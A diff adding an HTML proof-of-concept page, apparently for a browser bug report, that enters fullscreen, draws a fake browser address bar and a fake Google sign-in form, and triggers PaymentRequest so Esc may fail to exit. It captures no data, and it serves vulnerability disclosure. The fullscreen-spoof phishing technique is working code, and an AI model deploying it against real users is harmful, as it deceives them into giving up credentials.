@@ -1,0 +1,192 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>FPS PoC — fullscreen + PaymentRequest timing</title>
+<style>
+  html,body { height:100%; margin:0; font-family: Arial, sans-serif; background:#111; color:#ddd; }
+  .center { display:flex; align-items:center; justify-content:center; height:100%; }
+  button { font-size:18px; padding:12px 20px; }
+  /* Fake browser chrome + address bar */
+  .fake-chrome {
+    position:fixed; top:0; left:0; right:0; height:44px;
+    background:linear-gradient(#fff, #e8e8e8);
+    color:#000; display:flex; align-items:center; gap:12px; padding:6px 12px;
+    box-shadow:0 2px 6px rgba(0,0,0,0.4); z-index:9999; user-select:none;
+  }
+  .addr {
+    background:#fff; border-radius:6px; padding:8px 12px; flex:1; box-shadow: inset 0 -1px 0 rgba(0,0,0,0.06);
+  }
+  /* Fake login overlay (center) */
+  .overlay {
+    position:fixed; top:20%; left:50%; transform:translateX(-50%); width:420px;
+    background:#fff; color:#111; border-radius:8px; padding:24px; box-shadow:0 12px 40px rgba(0,0,0,0.6);
+    z-index:9998;
+  }
+  .overlay h1 { margin:0 0 10px; font-size:20px; }
+  .fake-input {
+    border:1px solid #ccd; border-radius:6px; padding:10px; margin:10px 0; min-height:20px;
+    outline:none; caret-color: #111;
+  }
+  .btn-row { display:flex; gap:8px; justify-content:flex-end; margin-top:12px; }
+  .btn { padding:8px 12px; border-radius:6px; border:none; cursor:pointer; }
+  .btn.primary { background:#1a73e8; color:#fff; }
+  /* fullscreen hint */
+  .hint { position:fixed; bottom:10px; left:10px; color:#aaa; font-size:13px; z-index:9999; }
+</style>
+</head>
+<body>
+
+<div class="center" id="start">
+  <button id="go">Enter fullscreen & trigger PaymentRequest</button>
+</div>
+
+<!-- elements shown only in fullscreen mode -->
+<div id="fullscreen-ui" style="display:none;">
+  <div class="fake-chrome" role="banner" aria-hidden="true">
+    <div style="width:36px; height:28px; background:#c00; border-radius:4px;"></div>
+    <div class="addr">https://accounts.google.com/ — Secure</div>
+    <div style="width:80px; text-align:right; font-size:13px; color:#333;">🔒 Secure</div>
+  </div>
+
+  <div class="overlay" id="overlay">
+    <h1>Sign in</h1>
+    <div>to continue to Google</div>
+
+    <!-- Use contenteditable DIVs instead of <input> to avoid incidental browser input-handling behaviors -->
+    <div id="email" class="fake-input" contenteditable="true" data-placeholder="Email or phone"></div>
+    <div id="password" class="fake-input" contenteditable="true" data-placeholder="Enter your password"></div>
+
+    <div style="font-size:12px; color:#666; margin-top:8px;">This is a simulated login to show fullscreen spoof UI.</div>
+
+    <div class="btn-row">
+      <button class="btn" id="cancel">Cancel</button>
+      <button class="btn primary" id="signin">Sign in</button>
+    </div>
+  </div>
+
+  <div class="hint">Press Esc to attempt to exit fullscreen (should exit on stable browsers).</div>
+</div>
+
+<script>
+/*
+  PoC behavior:
+  - On pressing the big "Enter fullscreen" button, the page requests fullscreen, shows fake UI,
+    and *immediately* triggers a PaymentRequest flow (without completing it).
+  - email/password fields are contenteditable divs so clicking them doesn't rely on native input.
+  - This reproduces the reported sequence: requestFullscreen -> PaymentRequest -> Esc stops working.
+*/
+
+/* helper to show placeholder text for contenteditable */
+function setupEditablePlaceholder(el) {
+  const ph = el.getAttribute('data-placeholder') || '';
+  function update() {
+    if (!el.textContent.trim()) {
+      el.style.color = '#888';
+      el.textContent = ph;
+      el.dataset._ph = '1';
+    } else if (el.dataset._ph) {
+      // if placeholder visible and user types, replace
+      el.textContent = '';
+      el.style.color = '';
+      delete el.dataset._ph;
+    } else {
+      el.style.color = '';
+    }
+  }
+  el.addEventListener('focus', () => {
+    if (el.dataset._ph) { el.textContent = ''; delete el.dataset._ph; el.style.color=''; }
+  });
+  el.addEventListener('blur', update);
+  el.addEventListener('keydown', (ev) => {
+    // keep keys within editable area; don't bubble or cause other default actions
+    ev.stopPropagation();
+  });
+  update();
+}
+
+/* PaymentRequest helper: minimal, non-blocking attempt; not a real payment */
+function tryPaymentRequest() {
+  // Make a minimal PaymentRequest call. This will typically open the PaymentRequest UI,
+  // but in this test the PaymentRequest prompt may not show depending on platform; the point
+  // is to trigger the API so that focus/keyboard behavior changes.
+  try {
+    const supportedInstruments = [{
+      supportedMethods: 'basic-card'
+    }];
+    const details = {
+      total: { label: 'Test', amount: { currency: 'USD', value: '0.01' } },
+      displayItems: []
+    };
+    const req = new PaymentRequest(supportedInstruments, details);
+    // We intentionally do not call show() or await completion — calling show() can present a prompt.
+    // Some browsers require show() to actually open UI; if you want to force it, uncomment:
+    // req.show().catch(()=>{});
+    // Instead, call getCapabilities-style access by creating & calling show then immediately ignoring results:
+    req.show().then(() => {}).catch(()=>{});
+  } catch (e) {
+    console.warn('PaymentRequest not supported or blocked:', e);
+  }
+}
+
+/* main button */
+document.getElementById('go').addEventListener('click', async function() {
+  const el = document.documentElement;
+  try {
+    await el.requestFullscreen({ navigationUI: 'auto' });
+  } catch (err) {
+    console.error('requestFullscreen failed', err);
+    // fallback: still show UI but can't reproduce fullscreen behavior
+  }
+
+  // Reveal our fullscreen UI (address bar + overlay)
+  document.getElementById('start').style.display = 'none';
+  document.getElementById('fullscreen-ui').style.display = '';
+
+  // Immediately trigger PaymentRequest (same sequence you reported)
+  // triggering without delay is intentional to reproduce the race/focus condition
+  tryPaymentRequest();
+
+  // Focus the overlay so keyboard events land on the page
+  document.getElementById('overlay').focus?.();
+
+});
+
+/* Setup placeholders on our fake inputs */
+setupEditablePlaceholder(document.getElementById('email'));
+setupEditablePlaceholder(document.getElementById('password'));
+
+/* Make contenteditable elements behave more like inputs for key events */
+['email','password'].forEach(id => {
+  const el = document.getElementById(id);
+  // capture key events so typing works naturally
+  el.addEventListener('keydown', (ev) => {
+    // allow default typing; but stop propagation so page-level handlers don't confuse things
+    ev.stopPropagation();
+  });
+});
+
+/* Cancel / Signin buttons for visual completeness */
+document.getElementById('cancel').addEventListener('click', () => {
+  // attempt graceful exit
+  if (document.fullscreenElement) document.exitFullscreen().catch(()=>{});
+});
+document.getElementById('signin').addEventListener('click', () => {
+  alert('Simulated sign-in (PoC). Do not enter real credentials here.');
+});
+
+/* Prevent pointerdown default on top-level UI so clicking won't produce native focus side-effects
+   (We specifically want to avoid native input focus that might change the sequence.)
+   Note: this is intentional for PoC; real sites should not block pointer events this way.
+*/
+document.getElementById('overlay').addEventListener('pointerdown', (ev) => {
+  // allow focusing the contenteditable, but don't let default 'focus' cause other platform behaviors
+  // (this is subtle and intentionally defensive for the PoC).
+  // Do NOT call ev.preventDefault() for production code; this is only to keep the PoC stable.
+  ev.stopImmediatePropagation();
+}, { capture: true });
+
+</script>
+</body>
+</html>
